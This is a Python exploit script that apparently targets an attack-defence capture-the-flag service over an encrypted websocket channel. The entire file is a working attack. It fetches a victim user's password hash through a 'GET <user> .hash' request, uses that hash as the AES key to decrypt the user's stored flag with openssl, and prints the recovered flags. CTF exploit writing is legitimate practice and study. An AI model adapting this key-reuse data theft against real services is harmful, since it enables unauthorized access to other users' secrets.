#!/usr/bin/env python3

import sys
import json
import typing
import asyncio
import hashlib
import contextlib
import dataclasses

import openssl
import channel


@dataclasses.dataclass(frozen=True)
class AttackData:
    username: str
    sha256_of_flag: str


@contextlib.asynccontextmanager
async def initialize(uri: str):
    async with openssl.OpenSSL.create() as ssl:
        async with channel.WebsocketChannel.create(uri, 'checker') as ws:
            _channel = channel.EncryptedChannel(ws, ssl)
            await _channel.establish()

            yield ssl, _channel


async def get_attack_data(host: str) -> typing.List[AttackData]:
    # TODO: use checksystem

    example = input('enter attack data: ')
    data = json.loads(example)

    return [
        AttackData(data['username'], data['sha256(flag)']),
    ]


async def decrypt_manual(ciphertext: bytes, key: bytes) -> bytes:
    iv, ciphertext = ciphertext[:16], ciphertext[16:]

    process = await asyncio.create_subprocess_exec(
        'openssl',
        'aes-128-cbc', '-d',
        '-iter', '16',
        '-k', key,
        '-iv', iv.hex(),
        stdin=asyncio.subprocess.PIPE,
        stdout=asyncio.subprocess.PIPE,
    )

    process.stdin.write(ciphertext)
    await process.stdin.drain()
    process.stdin.write_eof()

    plaintext = await process.stdout.read()

    try:
        process.terminate()
        await process.wait()
    except Exception:
        pass

    return plaintext


async def attack(host: str, port: int) -> typing.List[bytes]:
    property_name = 'flag'

    uri = f'ws://{host}:{port}/api/'
    attack_data = await get_attack_data(host)

    flags: typing.List[bytes] = []

    async with initialize(uri) as (_, ch):
        for data in attack_data:
            await ch.sendline(f'GET')
            await ch.sendline(f'{data.username} .hash')
            response = await ch.recvline()
            print(response)

            if response.startswith('ERROR'):
                continue

            password_hash = await ch.recvline()
            key = bytes.fromhex(password_hash)

            await ch.sendline(f'GET')
            await ch.sendline(f'{data.username} {property_name}')
            response = await ch.recvline()
            print(response)

            if response.startswith(f'ERROR'):
                continue

            content = await ch.recvline()
            ciphertext = bytes.fromhex(content)

            flag = await decrypt_manual(ciphertext, key)
            flag = flag.strip(b'\n')

            if hashlib.sha256(flag).hexdigest() != data.sha256_of_flag:
                continue

            flags.append(flag)

        await ch.sendline(f'EXIT')

    return flags


async def main():
    host = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) >= 3 else 17171

    flags = await attack(host, port)

    for flag in flags:
        print(flag, flush=True)


if __name__ == '__main__':
    asyncio.run(main())
